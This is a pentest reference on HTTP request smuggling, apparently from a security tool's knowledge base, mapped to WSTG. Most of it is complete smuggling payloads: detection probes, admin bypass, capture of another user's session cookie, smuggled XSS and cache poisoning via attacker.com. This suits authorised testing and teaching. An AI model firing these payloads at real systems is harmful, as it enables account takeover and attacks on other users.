---
id: PS-SMUGGLE
category: HTTP Request Smuggling
lab_count: 22
wstg_refs: [WSTG-INPV-15]
---

# HTTP Request Smuggling: Attack Technique Reference

HTTP request smuggling exploits discrepancies between how front-end and back-end servers determine the boundaries of HTTP requests. When two servers in a chain disagree on where one request ends and the next begins, an attacker can prepend arbitrary content to the next user's request. This enables access control bypass, credential theft, cache poisoning, and cross-site scripting without direct user interaction.

---

## 1. Detection

### 1A. Timing-Based Detection

Send requests that cause the back-end server to wait for additional data. If the response is delayed, the servers disagree on request boundaries.

**Detect CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

The front-end forwards all 4 bytes (including "X"). The back-end processes chunked encoding, sees chunk "1\r\nA", then waits for the next chunk terminator. If the response is delayed (typically 5-10 seconds), CL.TE is confirmed.

**Detect TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

The front-end processes chunked encoding and forwards everything (the zero-length terminator chunk plus trailing "X"). The back-end uses Content-Length: 6, reads "0\r\n\r\nX" (5 bytes), then waits for the 6th byte. A delayed response confirms TE.CL.

### 1B. Differential Response Confirmation

After timing suggests a variant, confirm by smuggling a request that causes the next legitimate request to receive an unexpected response.

**Confirm CL.TE:**

```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

Then immediately send a normal `GET /` request on the same connection. If the normal request returns 404 instead of 200, the `GET /404` prefix was smuggled onto it.

**Confirm TE.CL:**

```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0


```

Follow with a normal request. If it returns 404, TE.CL is confirmed.

### 1C. Detection Tooling

```bash
# smuggler.py - automated detection
rynix_plugin_run('wstg') python3 /app/tools/smuggler/smuggler.py -u https://target.com

# the template-scan plugin detects smuggling automatically via timing
# Manual: http_probe replay with "Update Content-Length" disabled
```

---

## 2. Techniques

### 2A. CL.TE

The front-end server uses Content-Length to determine the request boundary. The back-end server uses Transfer-Encoding: chunked. The attacker sets Content-Length to include the smuggled payload, but the back-end's chunked parser treats the zero-length chunk as the end of the first request, leaving the smuggled data queued as the start of the next request.

**Basic CL.TE smuggle:**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

The front-end forwards all 35 bytes as one request. The back-end sees the chunked terminator `0\r\n\r\n` and treats `GET /admin HTTP/1.1\r\nFoo: x` as the beginning of a new request. The next legitimate request's headers are appended after `Foo: x`, completing the smuggled request.

> Lab refs: PS-SMUGGLE-01, PS-SMUGGLE-14

### 2B. TE.CL

The front-end server uses Transfer-Encoding: chunked. The back-end server uses Content-Length. The attacker sends a valid chunked body that the front-end forwards in its entirety, but the back-end only reads Content-Length bytes, leaving the remainder as the start of the next request.

**Basic TE.CL smuggle:**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The front-end processes all chunks and forwards the entire body. The back-end reads only 4 bytes (per Content-Length), leaving `POST /admin ...` in the buffer as a new request.

> Lab refs: PS-SMUGGLE-02, PS-SMUGGLE-15

### 2C. TE.TE Obfuscation

Both servers support Transfer-Encoding, but one of them can be tricked into not processing it by obfuscating the header. The server that ignores the obfuscated TE header falls back to Content-Length, creating a CL.TE or TE.CL condition.

**Obfuscation variants (try each until one server ignores TE):**

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-Encoding: "chunked"

Transfer-Encoding: chunKed

Transfer-Encoding:
 chunked

Tr]ansfer-Encoding: chunked
```

Once an obfuscation causes one server to ignore the TE header, the attack proceeds as CL.TE or TE.CL depending on which server was fooled.

> Lab refs: PS-SMUGGLE-16

### 2D. CL.0 / 0.CL

Some servers ignore the Content-Length header entirely on certain endpoints, treating the request body as having zero length. The body content is left in the TCP buffer and parsed as the next request.

**CL.0 (back-end ignores Content-Length):**

```
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

GET /admin HTTP/1.1
Foo: x
```

The back-end ignores Content-Length for this endpoint (often static resource paths), processes the POST with an empty body, and treats the remaining bytes as a new request.

**Common CL.0 trigger endpoints:**
- Static file paths (`/images/`, `/assets/`, `/static/`)
- Endpoints that don't expect a body (some GET handlers serving POST)
- Endpoints that return early before reading the body

**0.CL (front-end ignores Content-Length):**

The front-end ignores Content-Length while the back-end processes it. Exploitable when combined with early-response gadgets that cause the front-end to send a response before reading the entire body. This breaks the deadlock that normally prevents 0.CL exploitation.

> Lab refs: PS-SMUGGLE-12, PS-SMUGGLE-13

### 2E. HTTP/2 Downgrade Attacks

When a front-end server accepts HTTP/2 but translates requests to HTTP/1 for the back-end, protocol translation introduces smuggling opportunities. HTTP/2 uses binary framing with explicit length fields, so it does not use Content-Length or Transfer-Encoding for message delimitation. However, during downgrade, these headers are reintroduced.

**H2.CL (HTTP/2 front-end, Content-Length back-end):**

Inject a `content-length` header into the HTTP/2 request that disagrees with the actual body length. HTTP/2 allows a `content-length` header for compatibility but determines body length from binary frames. If the front-end reuses the injected Content-Length during downgrade without recalculating, the back-end reads fewer bytes than the actual body, leaving the smuggled portion in the buffer.

```
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
content-length: 0

GET /admin HTTP/1.1
Host: target.com

```

The front-end's HTTP/2 framing includes the full body. During downgrade, it preserves `content-length: 0`. The back-end reads 0 bytes and treats `GET /admin ...` as the next request.

**H2.TE (HTTP/2 front-end, Transfer-Encoding back-end):**

The HTTP/2 spec says `transfer-encoding: chunked` should be stripped during downgrade, but misconfigured front-ends may pass it through. If they also fail to recalculate Content-Length, the back-end processes chunked encoding while the front-end relied on HTTP/2 framing.

```
:method: POST
:path: /
:authority: target.com
content-type: application/x-www-form-urlencoded
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

**CRLF injection in HTTP/2 headers:**

HTTP/2 headers are binary and can contain characters that would be illegal in HTTP/1 headers (specifically `\r\n`). During downgrade, these characters become HTTP/1 header delimiters, injecting additional headers.

```
:method: POST
:path: /
:authority: target.com
header-name: header-value\r\nTransfer-Encoding: chunked
```

After downgrade to HTTP/1, the `\r\n` creates a new header line, injecting `Transfer-Encoding: chunked` into the request. Combined with a crafted body, this enables smuggling.

**HTTP/2 request splitting via CRLF:**

Inject a complete second request into an HTTP/2 header value:

```
:method: GET
:path: /
:authority: target.com
header: value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

After downgrade, the `\r\n\r\n` terminates the first request's headers, and `GET /admin` becomes a second complete request.

> Lab refs: PS-SMUGGLE-08, PS-SMUGGLE-09, PS-SMUGGLE-10, PS-SMUGGLE-11

### 2F. HTTP/2 Request Tunnelling

When the front-end does not reuse connections to the back-end (each client request gets its own back-end connection), traditional smuggling is not possible because there is no second request to poison. However, CRLF injection in HTTP/2 headers can still inject additional headers into the downgraded request, which may leak internal headers or bypass access controls.

**Internal header leak via tunnelling:**

```
:method: POST
:path: /
:authority: target.com
header: value\r\nX-Internal-Header: injected
```

This injects `X-Internal-Header: injected` into the back-end request. If the front-end normally adds headers like `X-Forwarded-For` or `X-Real-IP` after user-supplied headers, the injected header can override or appear before them.

**HEAD method tunnelling:**

Using a HEAD request, the front-end expects a response with no body but the back-end may process a body. If the Content-Length from the HEAD response is used to frame a subsequent response, the attacker can inject content into the response queue.

> Lab refs: PS-SMUGGLE-19, PS-SMUGGLE-20

### 2G. Client-Side Desync

A browser-powered CL.0 attack where the victim's own browser triggers the desynchronization. The attacker causes the victim's browser to send a request to a vulnerable endpoint where the server ignores Content-Length. The browser sends the request body (containing the smuggled request) on the same connection, and the server treats it as a separate request.

**Requirements:**
1. An endpoint where the server ignores Content-Length (CL.0 behavior)
2. The endpoint must be accessible cross-origin (not blocked by SOP for the initial request)
3. The victim's browser must reuse the desynchronized connection for a subsequent same-origin request

**Attack flow:**
1. Victim visits attacker page
2. JavaScript sends a POST to the vulnerable CL.0 endpoint with a smuggled GET in the body
3. Server processes the POST with empty body, leaves the smuggled GET in the buffer
4. Browser sends a legitimate navigation request on the same connection
5. Server responds to the smuggled GET instead, potentially serving cached poison or capturing cookies

> Lab refs: PS-SMUGGLE-21

### 2H. Pause-Based Smuggling

Exploits server timeout behavior when the client pauses mid-request. Specifically targets Apache HTTP Server 2.4.52 and earlier with certain configurations. The attacker sends request headers, pauses for approximately 61 seconds (exceeding the server's read timeout), and the server processes what it has received, treating the body as a new request.

**Attack flow:**
1. Send headers with Content-Length indicating a body will follow
2. Pause for 61+ seconds without sending the body
3. The server times out waiting for the body, processes the request with empty body
4. Send the body (containing the smuggled request)
5. The server treats the body as a new, independent request

**Detection:**
- Send a normal request and note the response time
- Send headers only, pause 61 seconds, then send the body
- If the server responds twice (once after timeout, once after body), it is vulnerable

> Lab refs: PS-SMUGGLE-22

---

## 3. Exploitation Chains

### 3A. Security Control Bypass

Smuggle a request that the front-end would normally block (e.g., access to `/admin`). The front-end validates the outer request (which goes to an allowed path) but the smuggled inner request goes directly to the back-end, bypassing front-end access controls.

**CL.TE access control bypass:**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Foo: x
```

**TE.CL access control bypass:**

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

71
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

The smuggled request to `/admin` includes `Host: localhost`, which often satisfies back-end access controls that restrict admin access to local requests.

> Lab refs: PS-SMUGGLE-03, PS-SMUGGLE-04

### 3B. Revealing Front-End Rewriting

Many front-end servers add headers (like `X-Forwarded-For`, `X-Real-IP`, or internal routing headers) before forwarding to the back-end. Smuggle a request that reflects its own headers back in the response to discover these hidden headers.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

q=
```

The next user's request headers are appended to the `q=` parameter. The search response reflects the full captured headers, revealing internal header names and values.

> Lab refs: PS-SMUGGLE-05

### 3C. Request Capture

Smuggle a request that stores the next user's entire request (including cookies, authorization headers, and body) into a persistent storage mechanism like a comment, post, or profile field.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 276
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800
Cookie: session=ATTACKER_SESSION

postId=1&comment=
```

The next user's full request (including their Cookie header) is appended to `comment=` and stored. The attacker retrieves the comment to obtain the victim's session cookie.

**Key considerations:**
- Set a large Content-Length (800+) to capture more of the victim's request
- The comment/post must be viewable by the attacker afterward
- The captured content is truncated at the Content-Length boundary
- Multiple attempts may be needed to capture the right user

> Lab refs: PS-SMUGGLE-06

### 3D. XSS via Smuggling

Deliver a reflected XSS payload to another user without them clicking a malicious link. The smuggled request triggers a reflected XSS in the response that is served to the next legitimate user.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: target.com
Foo: x
```

The next user's request is prepended with the XSS-triggering GET. The response containing the reflected script is served to the victim, executing in their browser context.

**Advantage over normal reflected XSS:** No user interaction required. The victim simply needs to send any request through the same front-end server.

> Lab refs: PS-SMUGGLE-07

### 3E. Cache Poisoning

Smuggle a request that causes the back-end to return a response containing malicious content, and have this response cached by the front-end for a commonly accessed URL. All subsequent users requesting that URL receive the poisoned cache entry.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 178
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

If the back-end responds to `Host: attacker.com` with a redirect or the attacker's content, and the front-end caches this response under `/static/main.js`, all users receive the attacker's JavaScript.

> Lab refs: PS-SMUGGLE-17

### 3F. Cache Deception

The inverse of cache poisoning. Smuggle a request that causes the back-end to serve a user's sensitive response (e.g., `/my-account`) under a static, cacheable URL. The front-end caches the sensitive response, and the attacker retrieves it.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: x
```

The next user's request is rewritten to `GET /my-account`. Their account page (with personal data, session info) is returned. If the front-end caches this response under the URL the user originally requested (e.g., `/static/cached.js`), the attacker fetches that URL to read the victim's data.

> Lab refs: PS-SMUGGLE-18

---

## 4. Detection Payloads

### 4A. CL.TE Timing Detection

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

Expected: 5-10 second delay indicates CL.TE vulnerability.

### 4B. TE.CL Timing Detection

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Expected: 5-10 second delay indicates TE.CL vulnerability.

### 4C. CL.TE Differential Confirmation

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /smuggle-test HTTP/1.1
Foo: x
```

Follow immediately with `GET /`. If you get 404 or the `/smuggle-test` path reflected, CL.TE is confirmed.

### 4D. TE.CL Differential Confirmation

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /smuggle-test HTTP/1.1
Host: TARGET
Content-Length: 100

x=
0


```

Follow immediately with `GET /`. If you get 404, TE.CL is confirmed.

### 4E. H2.CL Detection

Send via HTTP/2 with injected content-length:

```
:method: POST
:path: /
:authority: TARGET
content-type: application/x-www-form-urlencoded
content-length: 0

GET /smuggle-h2cl HTTP/1.1
Host: TARGET

```

Follow with a normal HTTP/2 request. If you get 404, H2.CL is confirmed.

### 4F. CL.0 Detection

```
POST /resources/images/blog.svg HTTP/1.1
Host: TARGET
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /smuggle-cl0 HTTP/1.1
Foo: x
```

Try against static resource endpoints. If the follow-up request receives a 404, CL.0 is present.

---

## 5. TE Obfuscation Variants

When both servers support Transfer-Encoding but differ in header parsing strictness, try these obfuscation variants to make one server ignore the TE header:

| # | Variant | Technique |
|---|---------|-----------|
| 1 | `Transfer-Encoding: xchunked` | Invalid value |
| 2 | `Transfer-Encoding : chunked` | Space before colon |
| 3 | `Transfer-Encoding: chunked` followed by `Transfer-Encoding: x` | Duplicate header with invalid second value |
| 4 | `Transfer-Encoding:[tab]chunked` | Tab instead of space after colon |
| 5 | `[space]Transfer-Encoding: chunked` | Leading space before header name |
| 6 | `X: X[\n]Transfer-Encoding: chunked` | Header injection via bare newline |
| 7 | `Transfer-Encoding\n: chunked` | Newline within header name |
| 8 | `Transfer-Encoding: "chunked"` | Quoted value |
| 9 | `Transfer-Encoding: chunKed` | Mixed case |
| 10 | `Transfer-Encoding:\nchunked` | Newline before value (line folding) |
| 11 | `Tr]ansfer-Encoding: chunked` | Invalid character in header name |
| 12 | `Transfer-Encoding: chunk` | Truncated value |
| 13 | `Content-Length: 4\r\nTransfer-Encoding: chunked` | Both headers with CL first |
| 14 | `Foo: bar\r\nContent-Length: 0\r\n\r\nTransfer-Encoding: chunked` | TE after apparent header end |

**Testing approach:** For each variant, combine with a CL.TE or TE.CL timing payload. If one variant causes a delay, the obfuscation successfully tricked one of the two servers.

---

## 6. Quick Reference Table

| Variant | Front-End Uses | Back-End Uses | Detection Method | Key Indicator |
|---------|---------------|---------------|-----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding | Timing: short CL + incomplete chunk | Back-end waits for chunk terminator |
| TE.CL | Transfer-Encoding | Content-Length | Timing: complete chunk + extra data | Back-end waits for CL bytes |
| TE.TE | TE (standard) | TE (obfuscated away) | Try obfuscation variants + timing | One server ignores obfuscated TE |
| CL.0 | Content-Length | Ignores CL | POST to static endpoints + follow-up | Back-end treats body as next request |
| 0.CL | Ignores CL | Content-Length | Requires early-response gadget | Front-end responds before reading body |
| H2.CL | HTTP/2 framing | Content-Length | Inject content-length: 0 in H2 request | CL preserved during downgrade |
| H2.TE | HTTP/2 framing | Transfer-Encoding | Inject transfer-encoding in H2 request | TE not stripped during downgrade |
| H2.CRLF | HTTP/2 binary | HTTP/1 text | Inject \r\n in H2 header values | CRLF becomes delimiter after downgrade |
| Client-Side | Browser HTTP | Server CL.0 | Cross-origin POST to CL.0 endpoint | Browser reuses desynchronized connection |
| Pause-Based | Apache timeout | Body as new request | 61-second pause between headers and body | Server timeout triggers CL.0 behavior |
## Rynix workflow

1. `get_technique_guide` for `http-request-smuggling` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

